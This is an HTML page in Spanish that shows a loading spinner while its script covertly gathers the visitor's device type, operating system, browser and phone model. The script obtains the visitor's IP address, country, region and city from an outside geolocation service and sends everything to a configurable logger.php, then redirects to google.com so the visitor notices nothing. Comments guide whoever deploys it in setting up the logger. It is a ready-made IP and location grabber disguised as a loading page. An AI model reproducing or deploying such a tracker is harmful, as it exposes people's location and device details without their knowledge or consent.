<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background-color: #f0f2f5; 
            margin: 0; 
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script>
        // ==========================================
        // CONFIGURACIÓN
        // Cambia esto por la URL donde subiste tu logger.php
        // Ejemplo: 'https://mi-sitio-web.com/logger.php'
        const API_URL = 'logger.php'; 
        // ==========================================

        async function collectAndSend() {
            const userAgent = navigator.userAgent;
            
            // 1. Detectar Datos del Dispositivo
            let info = {
                type: 'Desktop',
                os: 'Unknown',
                browser: 'Unknown',
                mobileModel: 'N/A',
                ip: 'Unknown',
                country: 'Unknown',
                region: 'Unknown',
                city: 'Unknown',
                timestamp: new Date().toISOString().slice(0, 19).replace('T', ' ')
            };

            // Detección básica de OS y Móvil
            if (/Mobi|Android/i.test(userAgent)) {
                info.type = 'Mobile';
                if (/Android/i.test(userAgent)) {
                    info.os = 'Android';
                    let match = userAgent.match(/Android\s([0-9.]+)/);
                    if (match) info.os += ' ' + match[1];
                    // Intentar sacar modelo del user agent
                    match = userAgent.match(/\;\s([^;]+)\sBuild/);
                    if (match) info.mobileModel = match[1];
                } else if (/iPhone|iPad/i.test(userAgent)) {
                    info.os = 'iOS';
                    info.mobileModel = 'iPhone/iPad';
                }
            } else {
                if (/Windows/i.test(userAgent)) info.os = 'Windows';
                else if (/Mac/i.test(userAgent)) info.os = 'macOS';
                else if (/Linux/i.test(userAgent)) info.os = 'Linux';
            }

            // Detección de Navegador
            if (/Chrome/.test(userAgent)) info.browser = 'Chrome';
            else if (/Firefox/.test(userAgent)) info.browser = 'Firefox';
            else if (/Safari/.test(userAgent)) info.browser = 'Safari';

            // 2. Obtener IP y Ubicación (Usando API externa)
            try {
                const response = await fetch('https://ipapi.co/json/');
                const ipData = await response.json();
                info.ip = ipData.ip || 'Unknown';
                info.country = ipData.country_name || 'Unknown';
                info.region = ipData.region || 'Unknown';
                info.city = ipData.city || 'Unknown';
            } catch (e) {
                console.log("Bloqueador de anuncios detectado o error de red.");
            }

            // 3. Enviar al servidor PHP
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(info),
                    keepalive: true
                });
                console.log("Datos enviados.");
            } catch (err) {
                console.error("Error enviando log:", err);
            }

            // 4. Redirección final
            window.location.href = "https://www.google.com"; // SI QUIERES CAMBIAR LA REDIRECCIÓN, HAZLO AQUÍ
        }

        window.onload = collectAndSend;
    </script>
</body>
</html>